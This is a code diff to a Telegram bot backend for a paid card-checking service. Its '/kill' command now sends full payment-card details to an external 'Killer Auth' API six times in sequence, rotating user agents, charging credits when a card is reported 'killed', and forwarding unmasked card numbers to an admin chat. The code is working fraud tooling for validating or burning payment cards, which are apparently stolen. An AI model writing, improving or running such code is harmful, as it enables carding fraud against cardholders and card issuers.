@@ -6014,7 +6014,7 @@ ${profile.is_banned && profile.ban_reason ? `• Reason: ${profile.ban_reason}` 
       return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
     }
 
-    // /kill {cc} - Kill a card using Killer Auth gateway
+    // /kill {cc} - Kill a card using Killer Auth gateway (6 sequential requests)
     if (text.startsWith("/kill")) {
       const cc = text.replace("/kill", "").trim();
       
@@ -6069,43 +6069,77 @@ Top up at yunchicheck.com/dashboard/topup
       }
 
       // Send processing message
-      await sendTelegramMessage(chatId, `⏳ <b>Processing...</b>\n\nChecking card with Killer Auth...`, undefined, messageId);
+      await sendTelegramMessage(chatId, `⏳ <b>Processing...</b>\n\nSending 6 requests to Killer Auth API...`, undefined, messageId);
 
       const startTime = Date.now();
 
-      // Call Killer Auth API (same logic as killer-auth-check edge function)
+      // User agents for rotation
       const userAgents = [
         'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
         'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
         'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
+        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
       ];
-      const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
+      
       const apiUrl = `https://killer-2-gates-pyjk.vercel.app/ko/cc=${cc}?key=anmokupvttt`;
-
+      
+      // Send 6 requests sequentially and collect responses
+      const responses: { attempt: number; status: string; response: string; time: string }[] = [];
       let isKilled = false;
-      let apiMessage = "Unknown error";
-
-      try {
-        const response = await fetch(apiUrl, {
-          method: 'GET',
-          headers: {
-            'User-Agent': userAgent,
-            'Accept': 'application/json, text/plain, */*',
+      
+      for (let i = 1; i <= 6; i++) {
+        const attemptStart = Date.now();
+        const userAgent = userAgents[i - 1] || userAgents[0];
+        
+        try {
+          const response = await fetch(apiUrl, {
+            method: 'GET',
+            headers: {
+              'User-Agent': userAgent,
+              'Accept': 'application/json, text/plain, */*',
+              'Cache-Control': 'no-cache',
+              'Pragma': 'no-cache',
+            }
+          });
+          
+          const rawText = await response.text();
+          const attemptTime = ((Date.now() - attemptStart) / 1000).toFixed(2);
+          console.log(`[KILL BOT] Attempt ${i} for ${profile.username}: ${rawText}`);
+          
+          // Check for success
+          const attemptKilled = rawText.includes("KILLED SUCCESSFULLY");
+          if (attemptKilled) {
+            isKilled = true;
           }
-        });
+          
+          responses.push({
+            attempt: i,
+            status: attemptKilled ? "🟢 KILLED" : "🔴 FAILED",
+            response: rawText.substring(0, 100) + (rawText.length > 100 ? "..." : ""),
+            time: attemptTime
+          });
+        } catch (error) {
+          const attemptTime = ((Date.now() - attemptStart) / 1000).toFixed(2);
+          const errMsg = error instanceof Error ? error.message : "Connection failed";
+          console.error(`[KILL BOT] Attempt ${i} error:`, error);
+          
+          responses.push({
+            attempt: i,
+            status: "⚠️ ERROR",
+            response: errMsg,
+            time: attemptTime
+          });
+        }
         
-        const rawText = await response.text();
-        console.log(`[KILL BOT] API response for ${profile.username}: ${rawText}`);
-        
-        // Check for success - only "KILLED SUCCESSFULLY" means killed
-        isKilled = rawText.includes("KILLED SUCCESSFULLY");
-        apiMessage = rawText;
-      } catch (error) {
-        console.error("[KILL BOT] API error:", error);
-        apiMessage = error instanceof Error ? error.message : "API connection failed";
+        // Small delay between requests
+        if (i < 6) {
+          await new Promise(resolve => setTimeout(resolve, 500));
+        }
       }
 
-      const executionTime = ((Date.now() - startTime) / 1000).toFixed(2);
+      const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
       
       // Mask card for display
       const cardParts = cc.split("|");
@@ -6113,8 +6147,39 @@ Top up at yunchicheck.com/dashboard/topup
         ? `${cardParts[0].substring(0, 6)}******${cardParts[0].slice(-4)}`
         : "Invalid card";
 
+      // Build response message with all 6 results
+      let resultMessage = `
+━━━━━━━━━━━━━━━━━━━━━━
+   🎯 <b>KILLER AUTH RESULTS</b>
+━━━━━━━━━━━━━━━━━━━━━━
+
+<b>Card:</b> <code>${escapeHtml(maskedCard)}</code>
+<b>Total Time:</b> ${totalTime}s
+
+<b>━━━ 6 API Responses ━━━</b>
+`;
+
+      responses.forEach((r) => {
+        resultMessage += `
+<b>#${r.attempt}</b> ${r.status} (${r.time}s)
+└ <code>${escapeHtml(r.response)}</code>
+`;
+      });
+
+      // Count results
+      const killedCount = responses.filter(r => r.status.includes("KILLED")).length;
+      const failedCount = responses.filter(r => r.status.includes("FAILED")).length;
+      const errorCount = responses.filter(r => r.status.includes("ERROR")).length;
+
+      resultMessage += `
+<b>━━━ Summary ━━━</b>
+🟢 Killed: <b>${killedCount}</b>
+🔴 Failed: <b>${failedCount}</b>
+⚠️ Errors: <b>${errorCount}</b>
+`;
+
       if (isKilled) {
-        // Deduct 5 credits for successful kill
+        // Deduct 5 credits for successful kill (at least one success)
         const newCredits = profile.credits - 5;
         await supabase
           .from("profiles")
@@ -6130,19 +6195,13 @@ Top up at yunchicheck.com/dashboard/topup
           result: "killed"
         });
 
-        // NO broadcast to channel and NO GIF notification for /kill command
-        // Just send a simple text result to user
-        await sendTelegramMessage(chatId, `
+        resultMessage += `
+<b>━━━ Final Status ━━━</b>
 🟢 <b>KILLED SUCCESSFULLY</b> 🔥
 
-━━━━━━━━━━━━━━━━━━━━━━
-<b>Card:</b> <code>${escapeHtml(maskedCard)}</code>
-<b>Gateway:</b> Killer Auth
-<b>Time:</b> ${executionTime}s
-━━━━━━━━━━━━━━━━━━━━━━
-
 💰 <b>-5 credits</b> | Balance: <b>${newCredits}</b>
-`);
+━━━━━━━━━━━━━━━━━━━━━━
+`;
       } else {
         // Log the failed check (no credits deducted)
         await supabase.from("card_checks").insert({
@@ -6155,31 +6214,30 @@ Top up at yunchicheck.com/dashboard/topup
 
         // Send admin debug for unknown results
         if (ADMIN_TELEGRAM_CHAT_ID) {
+          const debugResponses = responses.map(r => `#${r.attempt}: ${r.response}`).join("\n");
           sendTelegramMessage(ADMIN_TELEGRAM_CHAT_ID, `
-🔍 <b>Killer Auth Debug</b>
+🔍 <b>Killer Auth Debug (6 Attempts)</b>
 
 <b>User:</b> ${escapeHtml(profile.username || "Unknown")}
 <b>Card:</b> <code>${escapeHtml(cc)}</code>
-<b>Status:</b> UNKNOWN
+<b>Status:</b> UNKNOWN (0/${responses.length} killed)
 
-<b>Raw Response:</b>
-<pre>${escapeHtml(apiMessage.substring(0, 1500))}</pre>
+<b>Responses:</b>
+<pre>${escapeHtml(debugResponses.substring(0, 2000))}</pre>
 `).catch(() => {});
         }
 
-        await sendTelegramMessage(chatId, `
+        resultMessage += `
+<b>━━━ Final Status ━━━</b>
 🔴 <b>NOT KILLED</b>
 
-━━━━━━━━━━━━━━━━━━━━━━
-<b>Card:</b> <code>${escapeHtml(maskedCard)}</code>
-<b>Gateway:</b> Killer Auth
-<b>Status:</b> UNKNOWN
-<b>Time:</b> ${executionTime}s
-━━━━━━━━━━━━━━━━━━━━━━
-
 💰 <b>Free</b> | Balance: <b>${profile.credits}</b>
-`);
+━━━━━━━━━━━━━━━━━━━━━━
+`;
       }
+
+      // Send the combined result message (NO broadcast, NO GIF)
+      await sendTelegramMessage(chatId, resultMessage);
 
       return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
     }
